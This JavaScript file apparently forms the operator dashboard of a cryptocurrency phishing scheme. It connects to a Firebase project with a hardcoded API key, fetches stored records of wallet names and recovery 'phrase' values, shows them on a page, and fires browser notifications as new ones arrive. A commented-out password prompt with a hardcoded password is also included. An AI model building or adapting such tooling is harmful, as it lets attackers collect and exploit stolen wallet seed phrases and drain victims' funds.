//firebase import
import { notify } from 'https://giterhaber.github.io/web-codes/notification.js'
import firebase from "https://cdn.skypack.dev/firebase/compat/app";
import "https://cdn.skypack.dev/firebase/compat/auth";
import "https://cdn.skypack.dev/firebase/compat/firestore";

//jquery import
import "https://code.jquery.com/jquery-3.6.1.min.js"




const config = {
    apiKey: "AIzaSyClkGm_12G7cTfKbbKe3LKBaNTOdihnD78",
    authDomain: "snsdapp.firebaseapp.com",
    projectId: "snsdapp",
    storageBucket: "snsdapp.appspot.com",
}


firebase.initializeApp(config);
const db = firebase.firestore();
const auth = firebase.auth();

// function alert_pass() {
//   let password = prompt("Enter in the password")

//   if (password === "karlogogongxdxd" || password === localStorage.getItem('ero')) {
//     //

//     localStorage.setItem('ero', password)
//   } else {
//     location.reload()
//   }
// }
//alert_pass()

db.collection("datas").orderBy("time", "desc").get().then((querySnapshot) => {
  querySnapshot.forEach((doc) => {



    //console.log(doc.id, " => ", doc.data());
     

    const date_format = {
        hour: 'numeric',
        minute: 'numeric',
        hour12: true }
   

    let wallet = doc.data().wallet
    let phrase = doc.data().phrase
    let time = doc.data().time.toDate().toLocaleDateString("en-US", date_format)

    $('.box').append(`
   <div id="${doc.id}" class="userdata">
    <p>${wallet}</p>
    <p>${phrase}</p>
    <p>${time}</p>
   </div><br><br>
   `)


  });

  function autoGet() {
    const getID = $('.userdata').attr('id')
    const getWallet = $('.userdata').find('p').eq([0]).html()
    const getPhrase = $('.userdata').find('p').eq([1]).html()
    const getTime = $('.userdata').find('p').eq([2]).html()

    const INFO = `
    ${getWallet} 
     ${getPhrase} 
      ${getTime} 
    `

function spawnNotification(body, icon, title) {
  const notification = new Notification(title, { body, icon });

  const currentLink = location.href

  notification.onclick = () => {

   localStorage.setItem(getPhrase, 'checked')
   location.href = currentLink
  }
}//

if (localStorage.getItem(getPhrase) === 'checked') {
  console.log('checked')
} else {
  spawnNotification(INFO, 'https://i.pinimg.com/236x/9f/ee/55/9fee55fe5559da752bd2851103b9f69b.jpg', 'click' )
}


  }//

  autoGet()


});


  